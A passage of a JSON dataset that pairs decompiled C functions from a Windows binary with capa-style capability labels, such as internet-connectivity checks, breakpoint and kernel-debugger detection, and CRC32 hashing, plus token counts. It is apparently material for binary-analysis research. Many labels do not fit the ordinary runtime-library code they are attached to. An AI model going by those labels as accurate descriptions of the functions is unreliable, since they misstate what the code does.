        "decompiled_code": "\nuint __cdecl fcn.004222f1(uint arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h)\n\n{\n    uint16_t uVar1;\n    uint uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_10h == NULL) {\n        arg_10h = 0x48feec;\n    }\n    uVar1 = (arg_ch & 0xffff) + 0x2400;\n    if (*arg_10h == 0) {\n        if (0x3ff < uVar1) {\n            if (arg_ch + 0x2800U < 0x400) {\n                *arg_10h = ((arg_ch & 0x27ff) + 0x40) * 0x400;\n                return 0;\n            }\n            uVar2 = fcn.00420484(arg_8h, arg_ch & 0xffff, arg_10h, arg_14h);\n            return uVar2;\n        }\n    }\n    else if (uVar1 < 0x400) {\n        var_8h = 0;\n        var_4h = 0;\n        uVar2 = fcn.00420484(arg_8h, (arg_ch & 0x23ff) + *arg_10h, &var_8h, arg_14h);\n        uVar2 = fcn.004220fd(uVar2, arg_10h);\n        return uVar2;\n    }\n    uVar2 = fcn.00422111(arg_10h, arg_14h);\n    return uVar2;\n}\n",
        "token_count": 369
    },
    "004224ef": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004224ef(uint8_t *arg_8h, uint8_t *arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar2 = fcn.0040e0ee();\n        *puVar2 = 0x16;\n        fcn.0040b81f();\n        iVar3 = 0x7fffffff;\n    }\n    else if (arg_ch == NULL) {\n        puVar2 = fcn.0040e0ee();\n        *puVar2 = 0x16;\n        fcn.0040b81f();\n        iVar3 = 0x7fffffff;\n    }\n    else if (arg_10h < 0x80000000) {\n        if (arg_10h == 0) {\n            iVar3 = 0;\n        }\n        else {\n            fcn.0040f75f(arg_14h);\n            do {\n                uVar1 = *arg_8h;\n                arg_8h = arg_8h + 1;\n                uVar4 = *(uVar1 + *(var_10h + 0x94));\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                iVar3 = uVar4 - *(uVar1 + *(var_10h + 0x94));\n                if ((iVar3 != 0) || (uVar4 == 0)) break;\n                arg_10h = arg_10h - 1;\n            } while (arg_10h != 0);\n            if (var_8h != '\\0') {\n                *(var_14h + 0x350) = *(var_14h + 0x350) & 0xfffffffd;\n            }\n        }\n    }\n    else {\n        puVar2 = fcn.0040e0ee();\n        *puVar2 = 0x16;\n        fcn.0040b81f();\n        iVar3 = 0x7fffffff;\n    }\n    return iVar3;\n}\n",
        "token_count": 528
    },
    "0042331b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint16_t * __cdecl fcn.0042331b(uint16_t *arg_8h, uint arg_ch)\n\n{\n    uchar auVar1 [16];\n    uchar auVar2 [16];\n    uint16_t uVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    \n    if (0 < *0x48f424) {\n        auVar1 = pshuflw(ZEXT216(arg_ch), ZEXT216(arg_ch), 0);\n        do {\n            if ((arg_8h & 0xfff) < 0xff1) {\n                uVar3 = SUB162(auVar1, 0);\n                uVar4 = SUB162(auVar1 >> 0x10, 0);\n                auVar2 = CONCAT214(-(*0x42f56e == arg_8h[7]), \n                                   CONCAT212(-(*0x42f56c == arg_8h[6]), \n                                             CONCAT210(-(*0x42f56a == arg_8h[5]), \n                                                       CONCAT28(-(*0x42f568 == arg_8h[4]), \n                                                                CONCAT26(-(*0x42f566 == arg_8h[3]), \n                                                                         CONCAT24(-(*0x42f564 == arg_8h[2]), \n                                                                                  CONCAT22(-(*0x42f562 == arg_8h[1]), \n                                                                                           -(*0x42f560 == *arg_8h)))))))\n                                  ) |\n                         CONCAT214(-(arg_8h[7] == uVar4), \n                                   CONCAT212(-(arg_8h[6] == uVar3), \n                                             CONCAT210(-(arg_8h[5] == uVar4), \n                                                       CONCAT28(-(arg_8h[4] == uVar3), \n                                                                CONCAT26(-(arg_8h[3] == uVar4), \n                                                                         CONCAT24(-(arg_8h[2] == uVar3), \n                                                                                  CONCAT22(-(arg_8h[1] == uVar4), \n                                                                                           -(*arg_8h == uVar3))))))));\n                uVar3 = SUB161(auVar2 >> 7, 0) & 1 | (SUB161(auVar2 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar2 >> 0x17, 0) & 1) << 2 | (SUB161(auVar2 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar2 >> 0x27, 0) & 1) << 4 | (SUB161(auVar2 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar2 >> 0x37, 0) & 1) << 6 | (SUB161(auVar2 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar2 >> 0x47, 0) & 1) << 8 | (SUB161(auVar2 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar2 >> 0x57, 0) & 1) << 10 | (SUB161(auVar2 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar2 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar2 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar2 >> 0x77, 0) & 1) << 0xe | SUB161(auVar2 >> 0x7f, 0) << 0xf;\n                if (uVar3 != 0) goto code_r0x004233b7;\n                iVar5 = 0x10;\n            }\n            else {\n                if (*arg_8h == arg_ch) {\n                    return arg_8h;\n                }\n                if (*arg_8h == 0) {\n                    return NULL;\n                }\n                iVar5 = 2;\n            }\n            arg_8h = arg_8h + iVar5;\n        } while( true );\n    }\n    uVar3 = *arg_8h;\n    while ((uVar3 != 0 && (uVar3 != arg_ch))) {\n        arg_8h = arg_8h + 1;\n        uVar3 = *arg_8h;\n    }\ncode_r0x00423356:\n    return (uVar3 != arg_ch) - 1 & arg_8h;\ncode_r0x004233b7:\n    iVar5 = 0;\n    if (uVar3 != 0) {\n        for (; (uVar3 >> iVar5 & 1) == 0; iVar5 = iVar5 + 1) {\n        }\n    }\n    arg_8h = arg_8h + iVar5;\n    uVar3 = *arg_8h;\n    goto code_r0x00423356;\n}\n",
        "token_count": 1134
    },
    "0040e625": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e625(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    int32_t arg_10h;\n    \n    puVar1 = arg_8h + 3;\n    if (((*puVar1 & 3) == 2) && ((*puVar1 & 0xc0) != 0)) {\n        iVar2 = arg_8h[1];\n        arg_10h = *arg_8h - iVar2;\n        *arg_8h = iVar2;\n        arg_8h[2] = 0;\n        if (0 < arg_10h) {\n            arg_8h_00 = fcn.00415447(arg_8h);\n            iVar2 = fcn.0041789c(arg_8h_00, iVar2, arg_10h, arg_ch);\n            if (arg_10h != iVar2) {\n                LOCK();\n                *puVar1 = *puVar1 | 0x10;\n                return 0xffffffff;\n            }\n            if ((*puVar1 >> 2 & 1) != 0) {\n                LOCK();\n                *puVar1 = *puVar1 & 0xfffffffd;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 299
    },
    "00412400": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_44h\n\nvoid __cdecl fcn.00412400(uint arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *arg_ch_00;\n    int16_t *piVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint var_44h;\n    uint var_40h;\n    int16_t *var_3ch;\n    int32_t *var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_1ch;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x48e22c ^ &stack0xfffffffc;\n    var_3ch = arg_ch;\n    fcn.004085e0(arg_8h, 0, 0x1ca);\n    uVar7 = 0;\n    var_38h = &var_30h;\ncode_r0x0041243d:\n    do {\n        iVar4 = 0;\n        uVar8 = uVar7;\n        while( true ) {\n            if (3 < uVar8) goto code_r0x004125c7;\n            if (iVar4 == 2) {\n                piVar6 = var_3ch;\n                do {\n                    iVar1 = *piVar6;\n                    piVar6 = piVar6 + 1;\n                } while (iVar1 != 0);\n                iVar5 = piVar6 - (var_3ch + 1) >> 1;\n            }\n            else {\n                iVar5 = fcn.0041d0f7(var_3ch, 0x4274ec);\n            }\n            uVar7 = uVar8 + 1;\n            piVar2 = var_38h + 3;\n            var_38h[-1] = var_3ch;\n            *var_38h = iVar5;\n            var_38h[1] = iVar4;\n            iVar1 = var_3ch[iVar5];\n            var_3ch = var_3ch + iVar5 + 1;\n            var_38h = piVar2;\n            if (iVar1 == 0x2d) goto code_r0x0041243d;\n            if (iVar1 != 0x2e) break;\n            iVar4 = 2;\n            uVar8 = uVar7;\n        }\n    } while (iVar1 == 0x5f);\n    if (uVar8 == 0) {\n        fcn.00412615(arg_8h, &var_34h);\n    }\n    else {\n        if (uVar8 == 1) {\n            cVar3 = fcn.00412615(arg_8h, &var_34h);\n            if (((cVar3 == '\\0') || (cVar3 = fcn.00412745(arg_8h, &var_28h),  cVar3 != '\\0')) ||\n               (cVar3 = fcn.00412687(arg_8h, &var_28h),  cVar3 != '\\0')) goto code_r0x004125c7;\n            arg_ch_00 = &var_28h;\n        }\n        else if (uVar8 == 2) {\n            cVar3 = fcn.00412615(arg_8h, &var_34h);\n            if ((cVar3 == '\\0') ||\n               (((cVar3 = fcn.00412745(arg_8h, &var_28h),  cVar3 != '\\0' &&\n                 ((cVar3 = fcn.00412687(arg_8h, &var_1ch),  cVar3 != '\\0' ||\n                  (cVar3 = fcn.004125d6(arg_8h, &var_1ch),  cVar3 != '\\0')))) ||\n                (cVar3 = fcn.00412687(arg_8h, &var_28h),  cVar3 == '\\0')))) goto code_r0x004125c7;\n            arg_ch_00 = &var_1ch;\n        }\n        else {\n            if (((uVar8 != 3) || (cVar3 = fcn.00412615(arg_8h, &var_34h),  cVar3 == '\\0')) ||\n               ((cVar3 = fcn.00412745(arg_8h, &var_28h),  cVar3 == '\\0' ||\n                (cVar3 = fcn.00412687(arg_8h, &var_1ch),  cVar3 == '\\0')))) goto code_r0x004125c7;\n            arg_ch_00 = &var_10h;\n        }\n        fcn.004125d6(arg_8h, arg_ch_00);\n    }\ncode_r0x004125c7:\n    fcn.00406dcc(arg_8h);\n    return;\n}\n",
        "token_count": 1126
    },
    "00412687": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00412687(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    uint32_t in_EAX;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_4h;\n    \n    uVar4 = 0;\n    if (arg_ch[2] == 0) {\n        if ((arg_ch[1] != 2) || (in_EAX = fcn.004127b5(*arg_ch, 2),  in_EAX == '\\0')) {\n            if (arg_ch[1] != 3) goto code_r0x00412733;\n            iVar3 = *arg_ch;\n            do {\n                uVar1 = *(iVar3 + uVar4 * 2);\n                arg_8h_00 = fcn.0040d9dd();\n                in_EAX = fcn.0040d5ae(arg_8h_00, uVar1, 4);\n                if (in_EAX == 0) goto code_r0x00412733;\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < 3);\n        }\n        iVar3 = fcn.0041ae1a(arg_8h + 0x80, 0x40, *arg_ch, arg_ch[1]);\n        if (iVar3 == 0) {\n            iVar3 = fcn.0041d0ec(arg_8h + 0x120, 0x55, 0x4252bc, 1);\n            if ((iVar3 == 0) && (iVar3 = fcn.0041d0ec(arg_8h + 0x120, 0x55, *arg_ch, arg_ch[1]),  iVar3 == 0)) {\n                return 1;\n            }\n        }\n        fcn.0040b84c(0, 0, 0, 0, 0);\n        pcVar2 = swi(3);\n        uVar4 = (*pcVar2)();\n        return uVar4;\n    }\ncode_r0x00412733:\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 499
    },
    "00423020": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.00423020(void)\n\n{\n    uint32_t uVar1;\n    float10 in_ST0;\n    uint32_t uStack28;\n    uint16_t uStack24;\n    \n    if (1 < *0x48f424) {\n        return in_ST0;\n    }\n    uStack28 = in_ST0 >> 0x20;\n    uStack24 = in_ST0 >> 0x40;\n    uStack24 = uStack24 & 0x7fff;\n    uVar1 = in_ST0 < 0;\n    if (uStack24 < 0x3fff) {\n        return 0;\n    }\n    if (uStack28 < 0) {\n        if (uStack24 < 0x401e) {\n            return (uStack28 >> (0x3eU - uStack24 & 0x1f) ^ -uVar1) + uVar1;\n        }\n        if (((uStack24 < 0x401f) && (uVar1 != 0)) && (uStack28 == 0x80000000)) {\n            return uStack28;\n        }\n    }\n    return 0x80000000;\n}\n",
        "token_count": 260
    },
    "0040aba3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040aba3(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t *arg_18h, int32_t arg_1ch, uint arg_20h\n            , uint32_t arg_24h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    fcn.0040b06c(arg_10h);\n    iVar2 = fcn.0040a1bc();\n    if ((((*(iVar2 + 0x20) != 0) || (*arg_8h == -0x1f928c9d)) || (*arg_8h == -0x7fffffda)) ||\n       (((*arg_18h & 0x1fffffff) < 0x19930522 || ((*(arg_18h + 8) & 1) == 0)))) {\n        if ((*(arg_8h + 1) & 0x66) == 0) {\n            if (((arg_18h[3] != 0) || ((0x19930520 < (*arg_18h & 0x1fffffff) && (arg_18h[7] != 0)))) ||\n               ((0x19930521 < (*arg_18h & 0x1fffffff) && ((arg_18h[8] >> 2 & 1) != 0)))) {\n                if ((((*arg_8h == -0x1f928c9d) && (2 < arg_8h[4])) && (0x19930522 < arg_8h[5])) &&\n                   (pcVar1 = *(arg_8h[7] + 8),  pcVar1 != NULL)) {\n                    (**0x424130)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h & 0xff);\n                    uVar3 = (*pcVar1)();\n                    return uVar3;\n                }\n                fcn.0040a538(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_24h, arg_1ch, arg_20h);\n            }\n        }\n        else if ((arg_18h[1] != 0) && (arg_1ch == 0)) {\n            fcn.0040ae56(arg_ch, arg_14h, arg_18h);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 566
    },
    "00405992": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405992(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.004058aa();\n    if ((arg_8h & 1) != 0) {\n        fcn.00406db9(in_ECX + -8);\n    }\n    return in_ECX + -8;\n}\n",
        "token_count": 81
    },
    "0040d397": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040d397(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x1c) >> 5 & 1) != 0) {\n        *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x80;\n    }\n    fcn.0040bedb(0);\n    return;\n}\n",
        "token_count": 92
    },
    "0040e293": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.0040e293(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00407b00(0x430bc0, 0x10);\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x20) = iVar1;\n    if (iVar1 == 0) {\n        iVar1 = *(unaff_EBP + 0xc);\n        *(iVar1 + 0x1c) = 1;\n        *(iVar1 + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, iVar1);\n    }\n    else {\n        if ((*(iVar1 + 0xc) >> 0xc & 1) == 0) {\n            *(unaff_EBP + -0x1c) = 0;\n            fcn.0040e26b(iVar1);\n            *(unaff_EBP + -4) = 0;\n            uVar2 = fcn.0040e32a(iVar1, *(unaff_EBP + 0xc));\n            *(unaff_EBP + -0x1c) = uVar2;\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.0040e322();\n            goto code_r0x0040e30c;\n        }\n        fcn.00416f94(iVar1);\n    }\n    uVar2 = 0xffffffff;\ncode_r0x0040e30c:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 474
    },
    "0040e68e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e68e(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint uVar2;\n    uint var_28h;\n    \n    uVar2 = 0;\n    fcn.0040b513(0);\n    if (arg_8h == 0) {\n        uVar2 = fcn.0040e580(0);\n        goto code_r0x0040e6e5;\n    }\n    iVar1 = fcn.0040e625(arg_8h, &var_28h);\n    if (iVar1 == 0) {\n        if ((*(arg_8h + 0xc) >> 0xb & 1) == 0) goto code_r0x0040e6e5;\n        arg_8h_00 = fcn.00415447(arg_8h);\n        iVar1 = fcn.00417071(arg_8h_00);\n        if (iVar1 == 0) goto code_r0x0040e6e5;\n    }\n    uVar2 = 0xffffffff;\ncode_r0x0040e6e5:\n    fcn.0040b55b();\n    return uVar2;\n}\n",
        "token_count": 277
    },
    "00416dc0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00416dc0(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    uint32_t *arg_ch_00;\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    uint noname_1;\n    \n    noname_1 = 0xc;\n    fcn.00407b00();\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.0041c37a(**(unaff_EBP + 8));\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = ***(unaff_EBP + 0xc);\n    arg_ch_00 = (*(unaff_EBP + 0xc))[1];\n    if ((*(*((arg_8h_00 >> 6) * 4 + 0x48fb00) + 0x28 + (arg_8h_00 & 0x3f) * 0x38) & 1) == 0) {\n        *(arg_ch_00 + 7) = 1;\n        arg_ch_00[6] = 9;\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = fcn.00416ef4(arg_8h_00, arg_ch_00);\n    }\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00416e45(0x430f70, noname_1, unaff_retaddr);\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar1;\n}\n",
        "token_count": 433
    },
    "00416e51": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00416e51(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint *var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    if (arg_8h == 0xfffffffe) {\n        *(arg_ch + 0x20) = 0;\n        *(arg_ch + 0x24) = 1;\n        *(arg_ch + 0x1c) = 1;\n        *(arg_ch + 0x18) = 9;\n    }\n    else {\n        if (((-1 < arg_8h) && (arg_8h < *0x48fd00)) &&\n           ((*(*((arg_8h >> 6) * 4 + 0x48fb00) + 0x28 + (arg_8h & 0x3f) * 0x38) & 1) != 0)) {\n            var_14h = &arg_8h;\n            var_8h = arg_8h;\n            var_10h = arg_ch;\n            var_ch = arg_8h;\n            uVar1 = fcn.00416dc0(&var_ch, &var_14h);\n            return uVar1;\n        }\n        *(arg_ch + 0x24) = 1;\n        *(arg_ch + 0x20) = 0;\n        *(arg_ch + 0x1c) = 1;\n        *(arg_ch + 0x18) = 9;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_ch);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 412
    },
    "0041789c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.0041789c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t lpCriticalSection;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00407b00(0x430fb0, 0x10);\n    lpCriticalSection = *(unaff_EBP + 8);\n    if (lpCriticalSection == 0xfffffffe) {\n        iVar2 = *(unaff_EBP + 0x14);\n        *(iVar2 + 0x24) = 1;\n        *(iVar2 + 0x20) = 0;\n        *(iVar2 + 0x1c) = 1;\n        *(iVar2 + 0x18) = 9;\n    }\n    else {\n        if ((-1 < lpCriticalSection) && (lpCriticalSection < *0x48fd00)) {\n            iVar2 = (lpCriticalSection & 0x3f) * 0x38;\n            *(unaff_EBP + -0x20) = iVar2;\n            if ((*(iVar2 + 0x28 + *((lpCriticalSection >> 6) * 4 + 0x48fb00)) & 1) != 0) {\n                fcn.0041c37a(lpCriticalSection);\n                uVar1 = 0xffffffff;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n                *(unaff_EBP + -4) = 0;\n                if ((*(*(unaff_EBP + -0x20) + 0x28 + *((lpCriticalSection >> 6) * 4 + 0x48fb00)) & 1) == 0) {\n                    iVar2 = *(unaff_EBP + 0x14);\n                    *(iVar2 + 0x1c) = 1;\n                    *(iVar2 + 0x18) = 9;\n                    *(iVar2 + 0x24) = 1;\n                    *(iVar2 + 0x20) = 0;\n                }\n                else {\n                    uVar1 = fcn.004179a4(lpCriticalSection, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14)\n                                        );\n                    *(unaff_EBP + -0x1c) = uVar1;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00417964();\n                goto code_r0x00417994;\n            }\n        }\n        iVar2 = *(unaff_EBP + 0x14);\n        *(iVar2 + 0x24) = 1;\n        *(iVar2 + 0x20) = 0;\n        *(iVar2 + 0x1c) = 1;\n        *(iVar2 + 0x18) = 9;\n        fcn.0040b7a2(0, 0, 0, 0, 0, iVar2);\n    }\n    uVar1 = 0xffffffff;\ncode_r0x00417994:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar1;\n}\n",
        "token_count": 793
    },
    "004185b7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004185b7(uint32_t arg_8h, uint *arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    \n    fcn.00415447(arg_ch);\n    if ((arg_ch[3] & 6) == 0) {\n        *(arg_10h + 0x18) = 9;\n    }\n    else {\n        if ((arg_ch[3] >> 0xc & 1) == 0) {\n            if ((arg_ch[3] & 1) == 0) {\ncode_r0x004183ef:\n                LOCK();\n                arg_ch[3] = arg_ch[3] | 2;\n                LOCK();\n                arg_ch[3] = arg_ch[3] & 0xfffffff7;\n                arg_ch[2] = 0;\n                if ((arg_ch[3] & 0x4c0) == 0) {\n                    cVar1 = fcn.00415483(arg_ch);\n                    if (cVar1 == '\\0') {\n                        fcn.004191a0(arg_ch);\n                    }\n                }\n                cVar1 = fcn.00418460(arg_8h, arg_ch, arg_10h);\n                if (cVar1 == '\\0') {\n                    LOCK();\n                    arg_ch[3] = arg_ch[3] | 0x10;\n                    arg_8h = 0xffffffff;\n                }\n                else {\n                    arg_8h = arg_8h & 0xff;\n                }\n                return arg_8h;\n            }\n            cVar1 = fcn.00418532(arg_ch);\n            arg_ch[2] = 0;\n            if (cVar1 != '\\0') {\n                *arg_ch = arg_ch[1];\n                LOCK();\n                arg_ch[3] = arg_ch[3] & 0xfffffffe;\n                goto code_r0x004183ef;\n            }\n            goto code_r0x00418394;\n        }\n        *(arg_10h + 0x18) = 0x22;\n    }\n    *(arg_10h + 0x1c) = 1;\ncode_r0x00418394:\n    LOCK();\n    arg_ch[3] = arg_ch[3] | 0x10;\n    return 0xffffffff;\n}\n",
        "token_count": 508
    },
    "00418f3b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nulong __cdecl fcn.00418f3b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t lpCriticalSection;\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    ulong uVar2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00407b00(0x431010, 0x18);\n    lpCriticalSection = *(unaff_EBP + 8);\n    if (lpCriticalSection == 0xfffffffe) {\n        iVar1 = *(unaff_EBP + 0x18);\n        *(iVar1 + 0x24) = 1;\n        *(iVar1 + 0x20) = 0;\n        *(iVar1 + 0x1c) = 1;\n        *(iVar1 + 0x18) = 9;\n    }\n    else {\n        if ((-1 < lpCriticalSection) && (lpCriticalSection < *0x48fd00)) {\n            *(unaff_EBP + -0x1c) = lpCriticalSection >> 6;\n            iVar1 = (lpCriticalSection & 0x3f) * 0x38;\n            *(unaff_EBP + -0x20) = iVar1;\n            if ((*(iVar1 + 0x28 + *((lpCriticalSection >> 6) * 4 + 0x48fb00)) & 1) != 0) {\n                fcn.0041c37a(lpCriticalSection);\n                *(unaff_EBP + -0x28) = 0xffffffff;\n                uVar2 = 0xffffffffffffffff;\n                *(unaff_EBP + -0x24) = 0xffffffff;\n                *(unaff_EBP + -4) = 0;\n                if ((*(*(unaff_EBP + -0x20) + 0x28 + *(*(unaff_EBP + -0x1c) * 4 + 0x48fb00)) & 1) == 0) {\n                    iVar1 = *(unaff_EBP + 0x18);\n                    *(iVar1 + 0x1c) = 1;\n                    *(iVar1 + 0x18) = 9;\n                    *(iVar1 + 0x24) = 1;\n                    *(iVar1 + 0x20) = 0;\n                }\n                else {\n                    uVar2 = fcn.00419061(lpCriticalSection, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14)\n                                         , *(unaff_EBP + 0x18));\n                    *(unaff_EBP + -0x28) = uVar2;\n                    *(unaff_EBP + -0x24) = uVar2 >> 0x20;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0041901d();\n                goto code_r0x0041904f;\n            }\n        }\n        iVar1 = *(unaff_EBP + 0x18);\n        *(iVar1 + 0x24) = 1;\n        *(iVar1 + 0x20) = 0;\n        *(iVar1 + 0x1c) = 1;\n        *(iVar1 + 0x18) = 9;\n        fcn.0040b7a2(0, 0, 0, 0, 0, iVar1);\n    }\n    uVar2 = 0xffffffffffffffff;\ncode_r0x0041904f:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 891
    },
    "0041b730": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
